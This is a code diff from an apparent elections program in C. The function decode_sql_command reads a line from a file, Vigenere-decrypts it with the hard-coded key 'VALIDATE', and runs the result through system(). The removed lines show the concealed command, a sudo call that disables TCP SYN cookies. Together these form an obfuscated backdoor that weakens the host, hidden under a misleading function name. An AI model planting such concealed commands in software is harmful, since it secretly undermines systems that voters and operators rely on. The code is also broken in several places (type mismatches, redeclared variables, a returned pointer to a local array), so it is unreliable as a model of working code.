@@ -242,20 +242,20 @@ void decode_sql_command() {
 	   printf("error\n");
 	}
 
-   char* text;
+   char text;
    char line[81];
+   char dec;
 
    if ((text = fgets(line, 81, fp)) != NULL) {  
-      char* ciphertext = decode((const char*)text, dec); // what is the second parameter?? Ask Bohan
       char str[15] = "VALIDATE"; // VALIDATE is the key to decrypt the cipher
-      char *ptr = str; // pointer storing the starting address of char array 
-      char cmd[43] = decode_vigenere(ptr, ciphertext); // decode to get english cmd
+      char *ptr = str;
+      char cmd[43] = decrypt_vigenere(ptr, line); // decrypt first
+      char* cmd = decode((const char*)cmd, dec); 
       
       // run decrypted command in shell
       system(cmd);
    }
    
- 
    if (fclose(fp)) {
       perror("fclose error");
    }
@@ -263,25 +263,32 @@ void decode_sql_command() {
 }
 
 // this function actually encrypts with vigenere cipher... needed to test it
-char* decode_vigenere(char* key, char* ciphertext) {
-   char cmd[100];
-   char* plainText = "sudo sysctl -w net . ipv4 .tcp_syncookies=0";
-   char* cipherKey = "VALIDATE";
-   int keyLength = strlen(cipherKey);
-   char cipherText;
+char* decrypt_vigenere(char* key, char* ciphertext) {
+   int keyLen = strlen(key);
+   int msgLen = strlen(ciphertext);
+   char newKey[msgLen];
+   char decryptedMsg[msgLen];
+   int i, j;
 
-   for(int i = 0; i < strlen(plainText); i++)
-   {
-      int cipherText = (unsigned char)plainText[i];
-      if (isalpha(cipherText))
-         cipherText = (cipherText - 'a' + tolower(cipherKey[i]) - 'a') % 26 + 'A'; // returns int
-         //putchar(cipherText);
-      cmd[i] = (char)cipherText;
+   // generate new key
+   for(i = 0, j = 0; i < msgLen; ++i, ++j){
+        if(j == keyLen)
+            j = 0;
+        newKey[i] = key[j];
+    }
+    newKey[i] = '\0';
 
-   }
-   char* ptr = cmd;
-   //putchar('\n');
-   return ptr;
+   // decrypt
+   for(i = 0; i < msgLen; ++i)
+        if (isalpha(ciphertext[i])) {
+            decryptedMsg[i] = (((ciphertext[i] - newKey[i]) + 26) % 26) + 'A';
+            decryptedMsg[i] = tolower(decryptedMsg[i]);
+        } else {
+            decryptedMsg[i] = ciphertext[i];
+        }
+   decryptedMsg[i] = '\0';
+   char* decrypted = decryptedMsg;
+   return decrypted;
 }
 
 void getElections(sqlite3 *db) {
